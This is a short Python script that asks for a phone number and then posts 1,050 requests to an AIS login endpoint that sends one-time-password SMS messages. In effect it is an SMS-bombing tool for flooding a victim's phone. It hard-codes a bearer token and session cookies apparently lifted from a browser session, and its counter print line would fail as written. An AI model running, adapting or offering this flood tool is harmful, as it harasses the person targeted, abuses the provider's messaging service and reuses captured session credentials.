import requests
import time

phone = input("PHONE ID : ")


headers = {
  "Host": "srfng.ais.co.th",
  "Connection": "keep-alive",
  "Content-Length": "254",
  "sec-ch-ua-mobile": "?0",
  "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIyMDQyMjIxMDQwODQ5MEliWk1oN0Q4Y0l4RW4iLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTY1MDYzNjI0OCwiZXhwIjoxNjUwNjM3NDQ4fQ.Co41hH4SsiuQ1PkZu12I5LtMeNdQgScl_nbSCGzwvVQ",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "Accept": "*/*",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
  "X-Requested-With": "XMLHttpRequest",
  "sec-ch-ua-platform": "Linux",
  "Origin": "https://srfng.ais.co.th",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Referer": "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
  "Cookie": "cX_P=kzy22p3i9vkfd84n; _ga=GA1.3.1034102755.1649004235; _fbp=fb.2.1649004235484.2037073013; AMCV_46FAEF9957D778167F000101%40AdobeOrg=-637568504%7CMCIDTS%7C19086%7CMCMID%7C69889942770620257284309807959770662485%7CMCAAMLH-1649609043%7C3%7CMCAAMB-1649609043%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1649011443s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.1.1; adcloud={%22_les_v%22:%22y%2Cais.co.th%2C1649006054%22}; s_nr=1649004265589-New; _gcl_au=1.1.1599730306.1649731490; _svtri=83dae835-aed0-4c1f-95bd-6c34f54d30d3; _svs=%7B%22p%22%3A%7B%2215%22%3A1650357568428%2C%224242%22%3A1650357568477%7D%7D; _gid=GA1.3.489438662.1650636223; _gat_UA-15158362-42=1; _gat_gtag_UA_15158362_42=1; _chunk=1; cX_S=l2ai6xbxm92w9rqs; ol3-0=po2YOaPtZc%252BHZHeXGrT4YmyCU3kWOnKrYgRtW70aaLxB4cdUmbcitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZHROPckhOCnNpXkyHoon0IbNsNkT9taHRzSC0416UOepjCCq7Hzp7jC9uFxlzhwRXKuccbWMB%252FgHqG3cAlQyV3noTBj%252BT8ywq18xTDl3vxp2IvVhZT0kIz0ssIROlnz4fcHw2Pab1kCgbmm%252Bhu%252Bi1iLgV%252BNqAGFMuUqxt5YY0J96zHe70sOGc3hz%252F6JSCDW96J1a85ZCE1d0jWPFb92TIQl0fOTTjcfIZh2kluEuDr9gvLGhvECJ8A2yYVn9T4Ch8%252F9qA3Vvx6%252FWKROaF812Xd4s0F2Ib3IhmfRPj6drqN61%252F3STP4Qlredrq9XXQ5qE4wbKUcpesE7YQA8PrgAd2uPyBFCIvItDsu3B15wN17%252FmeAVS68SUU7KVibOyYsAd1YpUXqnaFQzxWw1tK2KdrgSzlx2JTk59HcLn7lcMDZBmfuUOWuwxOBdJ7eWdaWUQXmLsDVkJvMd3ei%252F3zSe9OTjnRXUGqeNFXrB1tMesT5HYPSMGzHTO%252FInPJcwvJIrTzTi%252F3klmI5szIDBcOS169lsQA7xqUjUXontJppdb5M62jPy4jBulMewNrrhaTjMHPB4hFuwLFK5a1n2V4g6Y61pWwxsu%252BGSwaF0or7KhKX9hvToD%252Buff%252Bcl2a%252Bl%252BOzF50dF7XLU3ftj%252BPwrwIAM0BRIpEcyg8JCqCsC5pHz%252B6dHez%252BnLzB0P809UIwLgK%252BHhbGFIkk5%252F33bg05FJUrMS7AjHEbOwVlOdh3T61iJ4p%252B6901SOdF0KIDBGWLxOI4iSfvZVYYXxUAB5twBz0km%252BljSzbpbqB1WV0pd62Xy98WW6saZOacILbF8Eri5yTzZqXvf2ZS0mBxxL%252B4oYpmiXiF%252Fh9CdNG3%252BsCjZx9Z9VnKEIMhpqLnoHgzvKauvvF6PXngj8XbJOOwZieX7fVwJy6zYkR93R6gBK4M2K61p5Vn4MIj4df0daD39BOdTF2unIh3GKomVZnRoxdjurqWYh3bK7tN%252FIQbdagjx0gghSbtMzVXsxOMCk3DfouxAvdx3iBLg9nxeLATPfEnVVfjPPUQXsNrW31lPO4weiYoWNMPjfqpEf%252F2hAmAlEMIifxHEilzCRkwq7fsgbCzicMt4ZwatJUA3JLuV%252BkwwhW4YTqe6AMDj4J6sZBBJa3o8FXLfCirYuxjSTA5GWfqR6A4l58PXw5EmPKNlQEED8e758jwhyxHzcXEQC1EsiEud%252BiDY3xSDJ1i89SC4op2rwythnLJ5WtNGXbl9JgQQaobRk0z6VztqLM8xnmKx2uD%252F%252FLzQ55PPajyCMwILpnKEE3EcVwqsEBZgWgr7petBWTCeXZyOUxIVJSod0KDCHid3REE%252F0hv%252FeXr9872FdJPNfeTGncUyXksJqv1Z6Opkjy%252Bp1eVv5snabdPViw4dsyQIP%252FrUfIm0bx%252FLs5fFzbNLsebB2zneTzLVb0rX9p%252B732w4eZVfaQQi7kPANsyobyuW43F7U6YQQ8vkxTVyZR5pNQT%252FqYygYtT9ZfwUhEEQXD6o5HmFzaJiFeZD1e46XlW3RqhaCmazDpCMdrqQavNN4otT%252F2YYHOz64hDhw1q0Dxj4QImvQKDtCFCC%252BSVCjHW7LhsYKSu68ceheMUYv8gcVLKx3%252F0U5cJ%252FVESLlrTtE1v5t8LvqsZKGUVKM%252FsslQm%252BEQl7ceVYIyTtSCdZVV87%252BVZ3A%252BBnFSP9QZUN9mQY1W543w1mYb8Bvs1%252FhBXeQ8YsWwZ8KCnmz2ax3KkB3KKOS%252Beuu4U69SgMKTCE6HF%252FAEOQ9i0i1VOiVJJrRXn3%252FX3VJOUN%252FwWjZPPbuAARpgWHLz2qzngkOYKF1mO1CdmQQz7dunyOZvHOOB8zy2R%252FRSaYysgOjblW9cwvvdbp8QWa9lWHZAdEog68kjfS2hkp9g3bcRPZ3qlEJ0%252FKvcROPQ8nX5oxQmR4de%252FpoQxO775tJZpUnqrTuUK45b5xQJyAjFBHerK8DQ6WaN7uqHm6iOLd5ki6lnSU%252FShfimsOBo9Vow02uBdBo7mmi5IiMp4Eiq2pGDO4TX3TB7%252BzN0vgbCYaGY%252F2Ba8IsLu6LA5%252BG1DtF7DU8IhqyOTySdAxvMH8uSaLzTY8mHpsLVRZ%252F2OqCwtVWCAsBoH7YHvgyLcyKRQJCLqo351S0EnxNZ6oNUuIlSt6KcEwMR",
}

data = {
  "msisdn":f"{phone}",
  "serviceId":"AISPlay",
  "accountType":"all",
  "otpChannel":"sms"
}

for i in range(1050):
  i += 1
  name = requests.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW",data=data, headers=headers)

  print("ส่งข้อความไปแล้วจำนวน "+i)
